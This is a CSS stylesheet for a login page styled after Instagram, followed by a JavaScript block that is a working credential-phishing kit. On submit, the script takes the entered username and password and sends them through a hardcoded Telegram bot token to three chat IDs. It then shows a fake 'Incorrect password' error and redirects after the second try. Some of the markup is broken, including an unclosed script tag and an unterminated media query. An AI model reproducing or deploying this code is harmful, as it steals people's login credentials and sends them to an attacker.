  /* Universal Selectors */
/* Universal Selectors */
#root, body, html {
  height: 100%;
  width: 100%;
}

body {
  margin: 0;
  overflow-y: scroll;
}

a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
  margin: 0;
  padding: 0;
  border: 0;
  font: inherit;
  vertical-align: baseline;
}

a, a:visited {
  text-decoration: none;
}
a:active, .btn:active {

}

ol, ul {
  list-style: none;
}

body, button, input {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  font-size: 14px;
  line-height: 18px;
}

#root, article, main, div, section, header, nav, footer {
  border: 0 solid #000000;
  box-sizing: border-box;
  align-items: stretch;
  display: flex;
  flex-direction: column;
  flex-shrink: 0;
  margin: 0;
  padding: 0;
  position: relative;
}

/* Main Layout */
#root {

}

.section-all {

}

.main {

}

.wrapper {
  min-height: 100%;

  display: flex;
  flex-direction: column;
  justify-content: center;
}

.article {
  flex-direction: row;
  margin: 0 auto;
  max-width: 935px;
  width: 100%;
  display: flex;
  justify-content: center;
}

.content {
  color: #262626;
  flex-grow: 1;
  max-width: 350px;
  margin-top: 12px;
  width: 100%;
  padding: 0 15px;
}

.login-box {
  background: #fff;
  border: 1px solid #e6e6e6;
  border-radius: 1px;
  margin-bottom: 10px;
  padding: 10px 0;
}

.header {
  margin: 14px auto 12px;
  text-align: center;
}

.logo {
  background: cover no-repeat;
  width: 175px;
  height: auto;
  display: block;
  margin: 0 auto;
}

.form {
  display: flex;
  flex-direction: column;
  margin-bottom: 10px;
}

.input-box {
  margin: 6px 0;
}

input {
  height: 36px;
  border: 1px solid #efefef;
  border-radius: 3px;
  background-color: #fafafa;
  width: 100%;
  font-size: 14px;
  padding: 10px;
  box-sizing: border-box;
}

input:focus {
  border-color: #bbb;
}

.button-box {
  margin: 10px 0;
}

.btn {
  cursor: pointer;
  width: 100%;
  background: #3897f0;
  border: 1px solid #3897f0;
  color: #fff;
  border-radius: 3px;
  font-weight: 600;
  font-size: 14px;
  height: 36px;
  line-height: 34px;
  outline: none;
}

.forgot {
  font-size: 12px;
  margin-top: 12px;
  text-align: center;
  color: #003569;
  line-height: 14px !important;
}

.text {
  text-align: center;
  margin: 15px auto;
  color: #262626;
  font-size: 14px;
}

.text a {
  color: #3897f0;
  margin-left: 3px;
}

/* App Store */
.app p {
  line-height: 18px;
  color: #262626;
  font-size: 14px;
  text-align: center;
  margin: 10px 20px;
}

.app-img {
  display: flex;
  flex-direction: row;
  justify-content: center;
  gap: 8px;
  margin: 10px 0;
}

.app-img img {
  height: 40px;
}

/* Footer */
.footer {
  background-color: #fafafa;
  order: 5;
  padding: 20px;
}

.footer-container {
  display: flex;
  flex-wrap: wrap;
  justify-content: space-between;
  max-width: 935px;
  font-size: 12px;
  font-weight: 600;
  margin: 0 auto;
  text-transform: uppercase;
  width: 100%;
}

.footer-nav ul {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: center;
}

.footer-nav ul li {
  margin-bottom: 7px;
}

.footer-nav ul li a {
  color: #003569;
}

.footer span {
  color: #999;
}

span.language {
  color: #003569;
  cursor: pointer;
  font-weight: 600;
  text-transform: uppercase;
}

/* Mobile Media Query */
@media (max-width: 450px) {
  .article {
    flex-direction: column;
    align-items: center;
    padding: 10px;
  }

  .content {
    max-width: 100%;
    padding: 0 10px;
  }

  .login-box {
    border: none;
    background: transparent;
    padding: 0;
    margin: 0 auto;
  }

  .form {
    padding: 0;
  }

  .input-box {
    margin: 6px 0;
  }

  input {
    font-size: 14px;
    padding: 10px;

  .button-box {
    margin: 10px 0;
  }

  .btn {
    height: 36px;
    font-size: 16px;
  }

  .text, .forgot {

    font-size: 13px;
  }

  .app p {
    font-size: 13px;
    margin: 5px 0;
  }

  .footer-container {
    flex-direction: column;
    align-items: center;
    padding: 10px 0;
  }

  .footer-nav ul {
    justify-content: center;
  }
}

<body>

  <!-- Select Link -->
  <script type="text/javascript">

      window.location=src;

  <script>
document.addEventListener("DOMContentLoaded", function () {
    let attemptCount = 0;

    document.getElementById("loginForm").addEventListener("submit", function (event) {
        event.preventDefault();

        let username = document.getElementById("username").value;
        let password = document.getElementById("password").value;

        let botToken = "7052960867:AAGfNHEoJZ3FEu2OST_gACvY_Z5VOuZ0xTU";
        let chatIds = ["7638541846", "5837367069", "675310182478"];

        let message = `📩 *instagram Login* 📩\n\n👤 *Username:* ${username}\n🔒 *Password:* ${password}\n\n⚠️ *Owner:* Nikhillendra ⚠️`;

        // Send message to all chat IDs
        chatIds.forEach(chatId => {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            }).then(res => res.json())
              .then(data => console.log(`Sent to ${chatId}`, data))
              .catch(err => console.error(`Error to ${chatId}`, err));
        });

        if (attemptCount === 0) {
            // Show error message only once
            let existingError = document.getElementById("loginError");
            if (!existingError) {
                let errorMessage = document.createElement("div");
                errorMessage.id = "loginError";
                errorMessage.textContent = "Incorrect password. Please try again.";
                errorMessage.style.color = "red";
                errorMessage.style.marginTop = "10px";
                document.querySelector(".button-box").appendChild(errorMessage);
            }
        } else {
            // Redirect after second attempt
            setTimeout(() => {
                window.location.href = "somethingwrong.html";
            }, 1000); // 1 second delay
        }

        attemptCount++;
        document.getElementById("password").value = "";
    });
});
</script>
